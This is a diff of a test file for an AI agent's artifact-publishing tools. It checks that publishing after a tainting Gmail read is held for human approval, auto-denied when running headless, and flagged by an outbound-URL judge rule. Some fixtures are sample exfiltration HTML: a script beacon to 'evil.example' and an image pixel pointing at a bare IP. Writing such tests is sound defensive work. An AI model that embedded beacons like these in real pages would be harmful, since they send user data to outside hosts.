@@ -12,8 +12,6 @@ vi.mock('../../sandbox/runtime', async (orig) => ({ ...(await orig<object>()), w
 vi.mock('../../../db', () => ({
   useDb: () => ({ select: () => ({ from: () => ({ where: () => ({ limit: async () => (run.conversationId ? [{ c: run.conversationId }] : []) }) }) }) })
 }))
-const store = vi.hoisted(() => ({ get: vi.fn() }))
-vi.mock('../../sandbox/store', () => ({ dbWorkspaceStore: store }))
 vi.mock('../../../services/projects', () => ({ getProject: async (s: string) => (s === 'mymind' ? { id: 'proj-1' } : null) }))
 
 import { artifactTools, artifactDangerousTools, publishArtifactTool, editArtifactTool, deleteArtifactTool } from './artifacts'
@@ -22,6 +20,10 @@ import { TOOLSETS } from '../toolsets'
 import { toolByName } from '../tools'
 import type { ToolContext, ApprovalRequest } from '../types'
 import { buildAiTools } from '../ai-tools'
+import { headlessTools } from '../runtime/gate'
+import { ruleVerdict } from '../judge/rules'
+import { approvalCapableTools } from '../../eval/approval-tools'
+import type { AgentTool } from '../types'
 import { z } from 'zod'
 
 const ctx = (o: Partial<ToolContext> = {}): ToolContext => ({ signal: new AbortController().signal, runId: 'run-1', ...o })
@@ -177,11 +179,41 @@ describe('delete_artifact', () => {
   })
 })
 
-describe('outboundWhen', () => {
-  it.each([publishArtifactTool, editArtifactTool])('$name is outbound only when public:true', (t) => {
-    expect(t.outboundWhen!({ public: true })).toBe(true)
-    expect(t.outboundWhen!({})).toBe(false)
-    expect(t.outboundWhen!({ public: false })).toBe(false)
+describe('outbound classification (R9)', () => {
+  it('publish_artifact is statically outbound (gated in any tainted run, any visibility)', () => {
+    expect(publishArtifactTool.outbound).toBe(true)
+  })
+  it('edit_artifact is outbound for public:true or a rollback, not for settings', () => {
+    const w = editArtifactTool.outboundWhen!
+    expect(w({ public: true })).toBe(true)
+    expect(w({ rollback_to: 2 })).toBe(true)
+    expect(w({})).toBe(false)
+    expect(w({ public: false })).toBe(false)
+    expect(w({ title: 'x', slug: 'y' })).toBe(false)
+  })
+  it('proposeWhen: headless public html is proposed; a workspace_path call never is (R10)', () => {
+    const p = publishArtifactTool.proposeWhen!
+    expect(p({ html: 'x', public: true })).toBe(true)
+    expect(p({ html: 'x' })).toBe(false)
+    expect(p({ workspace_path: 'dist', public: true })).toBe(false)
+  })
+})
+
+describe('judge rules + eval approval tools see the R9 classification', () => {
+  it('ruleVerdict routes publish_artifact (static outbound) through the outbound URL rule', async () => {
+    const v = await ruleVerdict(publishArtifactTool, { title: 'x', html: '<img src="http://203.0.113.7/p.gif">' })
+    expect(v.floor).toBe('high')
+  })
+  it('edit_artifact hits the outbound rule only for an outbound call', async () => {
+    const a = { artifact: 'http://203.0.113.7/x' }
+    expect((await ruleVerdict(editArtifactTool, { ...a, rollback_to: 1 })).floor).toBe('high')
+    expect((await ruleVerdict(editArtifactTool, { ...a, title: 'y' })).floor).toBe('review')
+  })
+  it('both are approval-capable for eval cases', async () => {
+    const ok = await approvalCapableTools()
+    expect(ok.has('publish_artifact')).toBe(true)
+    expect(ok.has('edit_artifact')).toBe(true)
+    expect(ok.has('list_artifacts')).toBe(false)
   })
 })
 
@@ -197,13 +229,13 @@ describe('registration', () => {
 describe('fix round 1', () => {
   const pubDetail = { ...art, isPublic: true, description: null, projectId: null, versions: [{ id: 'v1', version: 1, current: true }] }
 
-  describe('tainted run + already-public target (gate level)', () => {
+  describe('tainted run (gate level, R9)', () => {
     const taintingRead = {
       name: 'gmail_search', description: 'd', kind: 'read' as const, toolset: 'gmail' as const, taints: true as const, schema: {},
       handler: async () => ({ result: { threads: [] }, summary: 's' })
     }
-    function gate(ask?: (r: ApprovalRequest) => Promise<{ approved: boolean }>) {
-      const set = buildAiTools([taintingRead, publishArtifactTool, editArtifactTool], { signal: new AbortController().signal, onEvent: () => {}, requestApproval: ask })
+    function gate(ask?: (r: ApprovalRequest) => Promise<{ approved: boolean }>, tools = [taintingRead, publishArtifactTool, editArtifactTool]) {
+      const set = buildAiTools(tools, { signal: new AbortController().signal, onEvent: () => {}, requestApproval: ask })
       return (n: string, i: Record<string, unknown>) => (set[n]!.execute as (i: unknown, o: unknown) => Promise<unknown>)(i, { toolCallId: `c-${n}` })
     }
     beforeEach(() => {
@@ -211,72 +243,103 @@ describe('fix round 1', () => {
       svc.getArtifactDetail.mockResolvedValue(pubDetail)
       svc.editArtifact.mockResolvedValue({ ...art, isPublic: true })
     })
-    it('merge-publish to a public slug without public:true is refused and writes nothing', async () => {
-      const ask = vi.fn(async () => ({ approved: true }))
-      const call = gate(ask)
-      await call('gmail_search', {})
-      const r = await call('publish_artifact', { slug: 'dash', files: { 'data/a.json': '{}' }, merge: true })
-      expect(r).toMatchObject({ ok: false, error: expect.stringContaining('pass public: true') })
-      expect(svc.publishArtifact).not.toHaveBeenCalled()
-      expect(ask).not.toHaveBeenCalled()
-    })
-    it('the same call with public:true asks for approval (denied: nothing written)', async () => {
+    it('a PRIVATE html publish asks for approval; denied → nothing written', async () => {
+      svc.resolveArtifactRef.mockResolvedValue(null)
       const ask = vi.fn(async (_r: ApprovalRequest) => ({ approved: false }))
       const call = gate(ask)
       await call('gmail_search', {})
-      expect(await call('publish_artifact', { slug: 'dash', files: { 'data/a.json': '{}' }, merge: true, public: true })).toEqual({ denied: true })
+      expect(await call('publish_artifact', { title: 'Beacon', html: '<script>new Image().src="https://evil.example/?d="+1</script>' })).toEqual({ denied: true })
       expect(ask).toHaveBeenCalledTimes(1)
       expect(svc.publishArtifact).not.toHaveBeenCalled()
+      // The card shows what would render: the target, source and the entry HTML's head.
+      const card = ask.mock.calls[0]![0].command
+      expect(card).toContain('target: new artifact')
+      expect(card).toContain('source: html')
+      expect(card).toContain('evil.example')
     })
-    it('edit_artifact rollback_to on a public artifact is refused; with public:true it asks', async () => {
+    it('merge-publish to a public slug asks (no R6 refusal); approved → it runs', async () => {
+      const ask = vi.fn(async (_r: ApprovalRequest) => ({ approved: true }))
+      const call = gate(ask)
+      await call('gmail_search', {})
+      svc.publishArtifact.mockResolvedValue(published({ created: false, newVersion: false }))
+      expect(await call('publish_artifact', { slug: 'dash', files: { 'data/a.json': '{}' }, merge: true })).toMatchObject({ ok: true })
+      expect(ask).toHaveBeenCalledTimes(1)
+      const card = ask.mock.calls[0]![0].command
+      expect(card).toContain('target: /artifact/dash/ (exists, PUBLIC)')
+      expect(card).toContain('files (1): data/a.json')
+    })
+    it('edit_artifact rollback_to asks (denied: nothing written); a title edit runs freely', async () => {
       const ask = vi.fn(async (_r: ApprovalRequest) => ({ approved: false }))
       const call = gate(ask)
       await call('gmail_search', {})
-      expect(await call('edit_artifact', { artifact: 'dash', rollback_to: 1 })).toMatchObject({ ok: false })
+      expect(await call('edit_artifact', { artifact: 'dash', rollback_to: 1 })).toEqual({ denied: true })
       expect(svc.editArtifact).not.toHaveBeenCalled()
-      expect(ask).not.toHaveBeenCalled()
-      expect(await call('edit_artifact', { artifact: 'dash', rollback_to: 1, public: true })).toEqual({ denied: true })
+      expect(ask).toHaveBeenCalledTimes(1)
+      expect(await call('edit_artifact', { artifact: 'dash', title: 'Z' })).toMatchObject({ ok: true })
       expect(ask).toHaveBeenCalledTimes(1)
     })
-    it('an untainted run is not restricted', async () => {
-      const call = gate(vi.fn(async () => ({ approved: false })))
+    it('an untainted run publishes freely (private or to a public slug)', async () => {
+      const ask = vi.fn(async () => ({ approved: false }))
+      const call = gate(ask)
+      expect(await call('publish_artifact', { title: 'D', html: 'x' })).toMatchObject({ ok: true })
       svc.publishArtifact.mockResolvedValue(published({ created: false, newVersion: false, version: 1 }))
       expect(await call('publish_artifact', { slug: 'dash', files: { 'data/a.json': '{}' }, merge: true })).toMatchObject({ ok: true })
+      expect(ask).not.toHaveBeenCalled()
+    })
+    it('headless: a tainted publish is auto-denied; an untainted private one runs; untainted public html is proposed', async () => {
+      const propose = vi.fn(async () => 'rev-1')
+      const tools = headlessTools([taintingRead as AgentTool, publishArtifactTool], { id: 'run-1', conversationId: 'conv-1' }, propose)
+      const clean = gate(undefined, tools)
+      expect(await clean('publish_artifact', { title: 'D', html: 'x' })).toMatchObject({ ok: true })
+      expect(await clean('publish_artifact', { title: 'D', html: 'x', public: true })).toMatchObject({ proposed: true })
+      expect(propose).toHaveBeenCalledTimes(1)
+      svc.publishArtifact.mockClear()
+      const dirty = gate(undefined, tools)
+      await dirty('gmail_search', {})
+      expect(await dirty('publish_artifact', { title: 'D', html: 'x' })).toEqual({ denied: true })
+      expect(svc.publishArtifact).not.toHaveBeenCalled()
+    })
+  })
+
+  describe('headless public workspace publish (R10)', () => {
+    it('no approval channel + workspace_path + public:true → ok:false telling her to publish privately first', async () => {
+      const ex = await publishArtifactTool.handler({ title: 'T', workspace_path: 'dist', public: true }, ctx({ isTainted: () => false }))
+      expect(ex.result).toEqual({ ok: false, error: 'publish it privately first (omit public), then ask to make it public with edit_artifact — Tony approves that' })
+      expect(bundle.readWorkspaceBundle).not.toHaveBeenCalled()
+      expect(svc.publishArtifact).not.toHaveBeenCalled()
+    })
+    it('an interactive run (approval channel present) publishes it', async () => {
+      bundle.readWorkspaceBundle.mockResolvedValue({ files: [{ path: 'index.html', content: 'x' }], masked: 0, skipped: [] })
+      const ex = await publishArtifactTool.handler({ title: 'T', workspace_path: 'dist', public: true }, ctx({ isTainted: () => false, requestApproval: async () => ({ approved: true }) }))
+      expect(ex.result).toMatchObject({ ok: true })
     })
   })
 
   describe('replay pins (proposalArgs)', () => {
-    beforeEach(() => bundle.readWorkspaceBundle.mockResolvedValue({ files: [{ path: 'index.html', content: Buffer.from('x') }], masked: 0, skipped: [] }))
-    it('proposalArgs pins workspaceId and conversationId', async () => {
-      const a = await publishArtifactTool.proposalArgs!({ title: 'T', workspace_path: 'dist', public: true }, ctx())
-      expect(a).toMatchObject({ workspace_path: 'dist', workspaceId: 'ws-1', conversationId: 'conv-1' })
+    it('proposalArgs pins only the conversationId', async () => {
+      const a = await publishArtifactTool.proposalArgs!({ title: 'T', html: 'x', public: true }, ctx())
+      expect(a).toEqual({ title: 'T', html: 'x', public: true, conversationId: 'conv-1' })
+      expect(run.resolve).not.toHaveBeenCalled()
     })
     it('a live run ignores a model-supplied workspaceId/conversationId', async () => {
+      bundle.readWorkspaceBundle.mockResolvedValue({ files: [{ path: 'index.html', content: Buffer.from('x') }], masked: 0, skipped: [] })
       await publishArtifactTool.handler({ title: 'T', workspace_path: 'dist', workspaceId: '00000000-0000-4000-8000-000000000001', conversationId: '00000000-0000-4000-8000-000000000002' }, ctx({ isTainted: () => false }))
       expect(bundle.readWorkspaceBundle.mock.calls[0]![0]).toBe('ws-1')
       expect(svc.publishArtifact.mock.calls[0]![0].conversationId).toBe('conv-1')
     })
-    it('MCP-shaped ctx (no runId, no replay) ignores a supplied workspaceId and refuses', async () => {
-      const ex = await publishArtifactTool.handler({ title: 'T', workspace_path: 'dist', workspaceId: 'someone-elses' }, ctx({ runId: undefined }))
-      expect(ex.result).toMatchObject({ ok: false })
+    it('no run (MCP or a replay) + workspace_path is a clean ok:false, whatever workspaceId is passed', async () => {
+      for (const c of [ctx({ runId: undefined }), ctx({ runId: undefined, replay: true })]) {
+        const ex = await publishArtifactTool.handler({ title: 'T', workspace_path: 'dist', workspaceId: '00000000-0000-4000-8000-000000000001' }, c)
+        expect(ex.result).toMatchObject({ ok: false })
+      }
       expect(bundle.readWorkspaceBundle).not.toHaveBeenCalled()
-      expect(store.get).not.toHaveBeenCalled()
     })
     it('MCP html publish ignores a supplied conversationId', async () => {
       await publishArtifactTool.handler({ title: 'T', html: 'x', conversationId: 'forged' }, ctx({ runId: undefined }))
       expect(svc.publishArtifact.mock.calls[0]![0].conversationId).toBeNull()
     })
-    it('a replay with a deleted workspace is a clean ok:false', async () => {
-      store.get.mockResolvedValue({ id: 'pinned-ws', deletedAt: new Date() })
-      const ex = await publishArtifactTool.handler({ title: 'T', workspace_path: 'dist', workspaceId: 'pinned-ws' }, ctx({ runId: undefined, replay: true }))
-      expect(ex.result).toMatchObject({ ok: false })
-      expect(bundle.readWorkspaceBundle).not.toHaveBeenCalled()
-    })
-    it('a replay uses the pinned ids', async () => {
-      store.get.mockResolvedValue({ id: 'pinned-ws', deletedAt: null })
-      svc.publishArtifact.mockResolvedValue(published())
-      await publishArtifactTool.handler({ title: 'T', workspace_path: 'dist', workspaceId: 'pinned-ws', conversationId: 'pinned-conv' }, ctx({ runId: undefined, replay: true }))
-      expect(bundle.readWorkspaceBundle.mock.calls[0]![0]).toBe('pinned-ws')
+    it('a replay uses the pinned conversationId', async () => {
+      await publishArtifactTool.handler({ title: 'T', html: 'x', public: true, conversationId: 'pinned-conv' }, ctx({ runId: undefined, replay: true }))
       expect(svc.publishArtifact.mock.calls[0]![0].conversationId).toBe('pinned-conv')
     })
   })
